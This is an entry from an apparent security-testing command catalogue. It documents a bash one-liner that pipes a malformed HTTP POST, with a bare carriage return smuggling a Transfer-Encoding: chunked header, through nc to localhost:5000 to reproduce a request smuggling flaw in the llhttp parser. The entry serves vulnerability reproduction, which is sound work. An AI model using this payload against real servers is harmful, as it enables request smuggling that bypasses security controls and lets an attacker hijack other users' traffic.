---
data: >-
  printf "POST / HTTP/1.1\r\nHost: localhost:5000\r\nX-Abc:\rxTransfer-Encoding:
  chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n" | nc localhost 5000
tags:
  - http
  - smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 6555bc2b-9305-49b7-828d-e03fef5a9845
created_at: '2025-12-13T09:01:17.215Z'
updated_at: '2025-12-13T09:01:17.215Z'
verified: false
validated: true
submitted: true
---
# Send Malformed HTTP Request

## Command

```bash
printf "POST / HTTP/1.1\r\nHost: localhost:5000\r\nX-Abc:\rxTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n" | nc localhost 5000
```

## Description

Generates and sends a crafted HTTP POST request to localhost:5000 with malformed headers to exploit the parsing issue. Used to reproduce the HTTP Request Smuggling vulnerability by sending a payload that the llhttp parser misinterprets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `printf` | Formats the HTTP request string with escapes for CR and LF | Yes |
| `nc localhost 5000` | Sends the output to the server on port 5000 | Yes |

## Examples

### Basic Usage

```bash
printf "POST / HTTP/1.1\r\nHost: localhost:5000\r\nX-Abc:\rxTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n" | nc localhost 5000
```

## Expected Output

Server logs parsed headers showing 'transfer-encoding: chunked' and body 'A'.

## Related

- [[procedures/Send-Crafted-HTTP-Request]]
